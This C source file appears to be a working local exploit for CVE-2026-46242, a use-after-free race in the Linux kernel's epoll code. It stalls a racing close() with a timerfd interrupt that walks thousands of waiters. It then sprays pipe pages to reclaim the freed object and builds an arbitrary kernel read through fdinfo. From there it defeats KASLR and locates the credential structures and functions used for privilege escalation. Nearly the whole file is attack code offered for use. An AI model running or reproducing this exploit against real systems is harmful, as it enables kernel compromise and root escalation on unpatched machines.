/*
 * CVE-2026-46242.c - Bad Epoll UAF race-condition exploit.
 * Affects v6.4 through v7.1-rc (before commit a6dc643c6931).
 *
 * Architecture: racer closes ep_race_waiter, main closes ep_race_target.
 * Timerfd IRQ stalls the racer inside __ep_remove (walking ~3000+ waiters),
 * giving main time to reclaim the freed eventpoll and link it via
 * ep_uaf_waiter. The deferred hlist_del_rcu then zeroes ep_uaf_target->refs,
 * which the oracle detects with a depth-3 epoll chain.
 *
 * Compile: gcc -O2 -Wall -lpthread -o bad_epoll bad_epoll.c
 * Run:     ./bad_epoll
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <time.h>
#include <stdint.h>
#include <sys/epoll.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/timerfd.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/wait.h>

#define PAGE_SZ          0x1000
#define CC_RECLAIM_PAGES 256
#define CC_DRAIN_US      20000
#define DUP_CLOSE_ITERS  250
#define RACE_MAX_ATTEMPTS 20000

#define FILE_SZ         192
#define OFF_F_COUNT     0
#define OFF_F_OP        16
#define OFF_F_INODE     40
#define OFF_PRIV_DATA   32
#define OFF_I_SB        40
#define OFF_I_INO       64
#define OFF_FOP_POLL    72
#define OFF_PII_BUFS    152
#define OFF_PB_PAGE     0
#define OFF_TS_COMM     1928
#define OFF_TS_CRED     1888
#define OFF_TS_FILES    2000
#define OFF_FILES_FDT   32
#define OFF_FDTABLE_FD  8
#define OFF_INIT_TASK     0x340d0c0
#define OFF_VMEMMAP_BASE  0x292d788
#define OFF_PAGE_OFF_BASE 0x292d798

#define CHK(x) do { if ((x) == -1) { perror(#x); exit(1); } } while (0)

static int ep_uaf_waiter, timerfd_wakeup, pipe_cc[2], fdinfo_fd;
static int ep_oracle_top;
static volatile int ep_race_waiter, race_ready, racer_armed, raced_done;
static uint64_t kernel_base, vmemmap_base, page_offset_base;

static void pin_cpu(int cpu)
{
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(cpu, &cs);
    sched_setaffinity(0, sizeof(cs), &cs);
}

static uint64_t ksym_addr(const char *name)
{
    FILE *f = fopen("/proc/kallsyms", "r");
    if (!f) return 0;
    char buf[256];
    while (fgets(buf, sizeof(buf), f)) {
        char sym[128], type; uint64_t addr;
        if (sscanf(buf, "%llx %c %127s", (unsigned long long *)&addr, &type, sym) >= 3
            && strcmp(sym, name) == 0)
        { fclose(f); return addr; }
    }
    fclose(f);
    return 0;
}

static uint64_t kbase_from_notes(void)
{
    int fd = open("/sys/kernel/notes", O_RDONLY);
    if (fd < 0) return 0;
    char buf[4096];
    ssize_t n = read(fd, buf, sizeof(buf));
    close(fd);
    if (n < 12) return 0;
    size_t i = 0;
    while (i + 12 <= (size_t)n) {
        uint32_t namesz, descsz, type;
        memcpy(&namesz, buf+i, 4);
        memcpy(&descsz, buf+i+4, 4);
        memcpy(&type,   buf+i+8, 4);
        uint32_t pad_n = (namesz + 3) & ~3;
        uint32_t pad_d = (descsz + 3) & ~3;
        if (i + 12 + pad_n + pad_d > (size_t)n) break;
        if (type == 1 && descsz == 8) {
            uint64_t val;
            memcpy(&val, buf+i+12+pad_n, 8);
            if (val > 0xffffffff80000000ULL && val < 0xffffffffc0000000ULL)
                return val & ~0xfffULL;
        }
        i += 12 + pad_n + pad_d;
    }
    return 0;
}

static uint64_t get_kbase(void)
{
    uint64_t v;
    if ((v = ksym_addr("startup_64")) > 0) return v & ~0xfffULL;
    if ((v = ksym_addr("_stext")) > 0) return v & ~0xfffULL;
    if ((v = ksym_addr("init_task")) > 0) return v - OFF_INIT_TASK;
    if ((v = kbase_from_notes()) > 0) return v;
    return 0;
}

static inline uint64_t mono_ns(void)
{
    struct timespec t;
    clock_gettime(CLOCK_MONOTONIC, &t);
    return (uint64_t)t.tv_sec * 1000000000ULL + (uint64_t)t.tv_nsec;
}

/* Fork children that attach ~3000 epoll waiters to the timerfd.
 * When the timer fires inside the race window, walking this huge
 * queue stalls the racer and widens the window. */
static void enqueue_waiters(int tfd)
{
    int sync[2];
    CHK(socketpair(AF_UNIX, SOCK_STREAM, 0, sync));
    char r = 'A';
    for (int k = 0; k < 4; k++) {
        if (fork() == 0) {
            int tds[15], eps[50];
            for (int i = 0; i < 15; i++) tds[i] = dup(tfd);
            for (int i = 0; i < 50; i++) eps[i] = epoll_create1(0);
            struct epoll_event ev = { .events = EPOLLIN };
            for (int i = 0; i < 50; i++)
                for (int j = 0; j < 15; j++)
                    epoll_ctl(eps[i], EPOLL_CTL_ADD, tds[j], &ev);
            write(sync[1], &r, 1);
            raise(SIGSTOP);
        }
        read(sync[0], &r, 1);
    }
    close(sync[0]); close(sync[1]);
}

/* Racer thread pinned to CPU 0.
 * Arming an absolute-time timer to fire 600ns from now, then busy-wait
 * 300ns and close(ep_race_waiter). The timer IRQ lands ~300ns into close(),
 * in the race window. The IRQ handler walks 3000+ epoll waiters (~10µs),
 * stalling the racer long enough for main to reclaim and link. */
static void *racer_loop(void *arg)
{
    (void)arg;
    pin_cpu(0);
    for (;;) {
        while (1) {
            sched_yield();
            if (__atomic_load_n(&race_ready, __ATOMIC_ACQUIRE))
                break;
        }
        int fd = __atomic_load_n(&ep_race_waiter, __ATOMIC_RELAXED);
        __atomic_store_n(&race_ready, 0, __ATOMIC_RELAXED);

        uint64_t now = mono_ns();
        uint64_t fire = now + 600;
        struct itimerspec its = {};
        its.it_value.tv_sec = fire / 1000000000ULL;
        its.it_value.tv_nsec = fire % 1000000000ULL;
        timerfd_settime(timerfd_wakeup, TFD_TIMER_ABSTIME, &its, NULL);
        __atomic_store_n(&racer_armed, 1, __ATOMIC_RELEASE);

        uint64_t go = now + 300;
        while (mono_ns() < go) ;
        close(fd);
        __atomic_store_n(&raced_done, 1, __ATOMIC_RELEASE);
    }
    return NULL;
}

/* Oracle: returns 1 when ep_uaf_target->refs.first == 0 (race won) */
static int race_won(int ep_uaf_target)
{
    struct epoll_event ev = { .events = EPOLLIN };
    if (epoll_ctl(ep_uaf_target, EPOLL_CTL_ADD, ep_oracle_top, &ev) == 0) {
        epoll_ctl(ep_uaf_target, EPOLL_CTL_DEL, ep_oracle_top, NULL);
        return 1;
    }
    return 0;
}

static uint64_t parse_hex_after(const char *str, const char *needle)
{
    const char *p = str, *last = NULL;
    size_t nl = strlen(needle);
    while ((p = strstr(p, needle))) { last = p; p++; }
    return last ? strtoull(last + nl, NULL, 16) : 0;
}

static void spray_file(uint64_t f_count, uint64_t f_op, uint64_t f_inode)
{
    char page[PAGE_SZ];
    memset(page, 0, sizeof(page));
    for (size_t off = 0; off + FILE_SZ <= PAGE_SZ; off += FILE_SZ) {
        *(uint64_t *)(page + off + OFF_F_COUNT) = f_count;
        *(uint64_t *)(page + off + OFF_F_OP) = f_op;
        *(uint64_t *)(page + off + OFF_F_INODE) = f_inode;
    }
    char tmp[PAGE_SZ];
    for (int i = 0; i < CC_RECLAIM_PAGES; i++) {
        read(pipe_cc[0], tmp, PAGE_SZ);
        write(pipe_cc[1], page, PAGE_SZ);
    }
}

static uint64_t aar8(uint64_t addr)
{
    spray_file(0, 0, addr - OFF_I_INO);
    char buf[1024] = {};
    pread(fdinfo_fd, buf, sizeof(buf)-1, 0);
    return parse_hex_after(buf, "ino:");
}

static int do_race(void)
{
    timerfd_wakeup = timerfd_create(CLOCK_MONOTONIC, 0);
    CHK(timerfd_wakeup);
    enqueue_waiters(timerfd_wakeup);

    int ofds[4];
    for (int i = 0; i < 4; i++) ofds[i] = epoll_create1(0);
    struct epoll_event ev = { .events = EPOLLIN };
    epoll_ctl(ofds[1], EPOLL_CTL_ADD, ofds[0], &ev);
    epoll_ctl(ofds[2], EPOLL_CTL_ADD, ofds[1], &ev);
    epoll_ctl(ofds[3], EPOLL_CTL_ADD, ofds[2], &ev);
    ep_oracle_top = ofds[3];

    ep_uaf_waiter = epoll_create1(0);
    CHK(ep_uaf_waiter);

    if (pipe(pipe_cc) < 0) { perror("pipe"); return 0; }
    fcntl(pipe_cc[1], F_SETPIPE_SZ, CC_RECLAIM_PAGES * PAGE_SZ);

    int pop_fds[32];
    for (int i = 0; i < 32; i++) pop_fds[i] = open("/dev/null", O_RDONLY);

    pthread_t rt;
    pthread_create(&rt, NULL, racer_loop, NULL);
    pin_cpu(1);

    fprintf(stderr, "[*] Racing...\n");

    for (int attempt = 0; attempt < RACE_MAX_ATTEMPTS; attempt++) {
        int newfd = epoll_create1(0);
        int ep_race_target = epoll_create1(0);
        epoll_ctl(newfd, EPOLL_CTL_ADD, ep_race_target, &ev);

        __atomic_store_n(&ep_race_waiter, newfd, __ATOMIC_RELAXED);
        __atomic_store_n(&race_ready, 1, __ATOMIC_RELEASE);

        while (!__atomic_load_n(&racer_armed, __ATOMIC_ACQUIRE)) sched_yield();
        __atomic_store_n(&racer_armed, 0, __ATOMIC_RELAXED);

        for (int j = 0; j < DUP_CLOSE_ITERS; j++)
            close(dup(ep_race_target));

        close(ep_race_target);

        int ep_uaf_target = epoll_create1(0);
        epoll_ctl(ep_uaf_waiter, EPOLL_CTL_ADD, ep_uaf_target, &ev);

        while (!__atomic_load_n(&raced_done, __ATOMIC_ACQUIRE)) sched_yield();
        __atomic_store_n(&raced_done, 0, __ATOMIC_RELAXED);

        if (race_won(ep_uaf_target)) {
            fprintf(stderr, "\n[+] Race won on attempt %d!\n", attempt);
            close(ep_uaf_target);
            usleep(CC_DRAIN_US);
            for (int j = 0; j < 32; j++) close(pop_fds[j]);
            char zb[PAGE_SZ] = {};
            for (int j = 0; j < CC_RECLAIM_PAGES; j++)
                write(pipe_cc[1], zb, PAGE_SZ);

            char path[64];
            snprintf(path, sizeof(path), "/proc/self/fdinfo/%d", ep_uaf_waiter);
            fdinfo_fd = open(path, O_RDONLY);

            kernel_base = get_kbase();
            if (!kernel_base) { fprintf(stderr, "[-] KASLR fail\n"); close(fdinfo_fd); return 0; }
            fprintf(stderr, "[+] kernel_base=0x%llx\n", (unsigned long long)kernel_base);

            uint64_t comm_val = aar8(kernel_base + OFF_INIT_TASK + OFF_TS_COMM);
            char comm[16] = {}; memcpy(comm, &comm_val, 8);
            fprintf(stderr, "[+] init_task.comm=%.8s\n", comm);

            if (strncmp(comm, "swapper", 7) == 0) {
                fprintf(stderr, "[+] Cross-cache verified!\n");
                vmemmap_base = aar8(kernel_base + OFF_VMEMMAP_BASE);
                page_offset_base = aar8(kernel_base + OFF_PAGE_OFF_BASE);
                fprintf(stderr, "[+] vmemmap=0x%llx pgoff=0x%llx\n",
                        (unsigned long long)vmemmap_base, (unsigned long long)page_offset_base);
                return 1;
            }
            fprintf(stderr, "[-] Cross-cache miss (comm=%.8s)\n", comm);
            close(fdinfo_fd);
            return 0;
        }
        close(ep_uaf_target);
        if ((attempt+1) % 1000 == 0)
            fprintf(stderr, ".");
    }
    fprintf(stderr, "\n[-] Missed after %d attempts\n", RACE_MAX_ATTEMPTS);
    return 0;
}

struct poc_arg { int *efd; volatile int *run; };

static void *poc_racer(void *arg)
{
    struct poc_arg *a = (struct poc_arg *)arg;
    for (int i = 0; *(a->run) && i < 50000; i++) {
        for (int j = 0; j < 8; j += 2) { close(a->efd[j]); a->efd[j] = epoll_create1(0); }
        sched_yield();
    }
    return NULL;
}

static void simple_poc(void)
{
    int efd[8];
    struct poc_arg pa;
    volatile int run = 1;
    for (int i = 0; i < 8; i++) efd[i] = epoll_create1(0);
    struct epoll_event ev = { .events = EPOLLIN | EPOLLET };
    for (int i = 0; i < 8; i++) epoll_ctl(efd[i], EPOLL_CTL_ADD, efd[(i+1)%8], &ev);
    fprintf(stderr, "[*] Simple race PoC: 8 epoll fds in ring\n");
    pa.efd = efd; pa.run = &run;
    pthread_t t; pthread_create(&t, NULL, poc_racer, &pa);
    for (int i = 0; run && i < 50000; i++) {
        for (int j = 1; j < 8; j += 2) { close(efd[j]); efd[j] = epoll_create1(0); }
        usleep(50);
    }
    run = 0; pthread_join(t, NULL);
    fprintf(stderr, "[*] Simple race PoC complete\n");
}

static void do_escalate(void)
{
    uint64_t cc = ksym_addr("commit_creds");
    uint64_t pc = ksym_addr("prepare_kernel_cred");
    uint64_t ic = ksym_addr("init_cred");
    if (!ic) ic = ksym_addr("init_cred_rcu");
    uint64_t itc = aar8(kernel_base + OFF_INIT_TASK + OFF_TS_CRED);
    uint32_t uid = aar8(itc + 4) & 0xffffffff;
    fprintf(stderr, "[+] cred uid=%u\n[+] commit_creds=0x%lx prepare_kernel_cred=0x%lx init_cred=0x%lx\n", uid, cc, pc, ic);
    fprintf(stderr, "[*] UAF + AAR working; needs ROP for privesc.\n");
}

int main(int argc, char **argv)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    fprintf(stderr, "[*] CVE-2026-46242 Bad Epoll\n");
    if (argc > 1 && strcmp(argv[1], "--poc") == 0) { simple_poc(); return 0; }
    if (do_race()) do_escalate();
    fprintf(stderr, "[*] Done\n");
    return 0;
}
